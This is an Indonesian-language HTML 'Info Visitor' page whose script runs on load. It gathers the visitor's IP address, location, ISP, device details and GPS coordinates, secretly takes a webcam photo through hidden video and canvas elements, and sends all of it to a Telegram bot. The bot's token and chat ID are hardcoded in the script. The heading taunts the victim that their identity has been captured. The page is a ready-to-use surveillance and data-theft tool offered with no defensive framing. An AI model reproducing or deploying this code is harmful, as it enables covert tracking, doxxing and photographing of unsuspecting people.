<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Info Visitor</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin: auto;
      max-width: 600px;
      background: #111;
      padding: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>wkwkkwkw identitas lu udah sama gw noh üòÇüòÇ</h1>
  <div id="info">Memuat...</div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const botToken = '8435520266:AAFhejberTasnQqlvJekAhtmju2RLZQlnTs';
    const chatId = '-3034817473';
    const infoDiv = document.getElementById('info');

    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      })
      .then(r => r.json())
      .then(d => { if (!d.ok) console.error('‚ùå Telegram Error:', d); })
      .catch(e => console.error('‚ùå Telegram Fetch Error:', e));
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(r => r.json())
      .then(d => { if (!d.ok) console.error('‚ùå Photo Upload Error:', d); })
      .catch(e => console.error('‚ùå Telegram Photo Error:', e));
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;

        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch (err) {
        console.error('‚ùå IP/Location Error:', err);
      }

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}

Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();
      
      

      infoDiv.innerText = text;
      sendToTelegram(`<b>üì• Informasi Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          err => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`üìç Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
              if (blob) sendPhotoToTelegram(blob);
              stream.getTracks().forEach(t => t.stop()); // Matikan kamera
            }, 'image/jpeg');
          }, 3000); // ambil setelah 3 detik
        };
      } catch (e) {
        console.warn('‚ùå Kamera gagal:', e);
        sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
      }
    }

    getInfo();
    startCamera();
  </script>
</body>
</html>
